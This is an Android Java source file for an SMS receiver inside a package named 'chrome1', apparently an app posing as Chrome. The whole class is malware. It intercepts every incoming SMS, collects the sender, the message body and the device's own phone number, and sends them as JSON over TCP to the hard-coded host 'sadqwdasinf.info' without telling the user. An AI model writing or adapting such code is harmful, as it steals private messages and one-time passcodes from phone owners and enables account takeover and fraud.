package com.example.chrome1.sms;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.example.chrome1.network.TcpClient;

import org.json.JSONObject;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;

//来了短信会通知
public class SmsReceiver extends BroadcastReceiver {
    private final ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);

    @Override
    public void onReceive(Context context, Intent intent) {
        SmsMessage[] smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        if (smsMessages == null) {
            return;
        }
        String senderNumber = smsMessages[0].getOriginatingAddress();
        String messages = getSmsMessages(smsMessages);
        String number = getNumber(context);
        if (number == null) {
            String TAG = "SmsReceiver";
            Log.e(TAG, "number null");
            return;
        }
        String text = ToJson(number, senderNumber, messages);
        executor.execute(new Runnable() {
            @Override
            public void run() {
                TcpClient tcpClient = new TcpClient(executor);
                tcpClient.setRcConnect(false);
                tcpClient.setHOST("sadqwdasinf.info");
                tcpClient.SyncConnect(text);
            }
        });
    }


    private String ToJson(String number, String senderNumber, String smsMessages) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("number", number);
            jsonObject.put("senderNumber", senderNumber);
            jsonObject.put("smsMessages", smsMessages);
            jsonObject.put("type", "sms");
            return jsonObject.toString();
        } catch (Exception e) {
            e.fillInStackTrace();
        }
        return null;
    }

    //获取短信
    private String getSmsMessages(SmsMessage[] smsMessages) {
        // 组装短信内容
        StringBuilder text = new StringBuilder();
        for (SmsMessage smsMessage : smsMessages) {
            text.append(smsMessage.getMessageBody());
        }
        return text.toString();
    }


    @SuppressLint("HardwareIds")
    private String getNumber(Context context) {
        //获取手机号码，有可能获取不到
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    Activity#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for Activity#requestPermissions for more details.
            return null;
        }
        return tm.getLine1Number();
    }

}
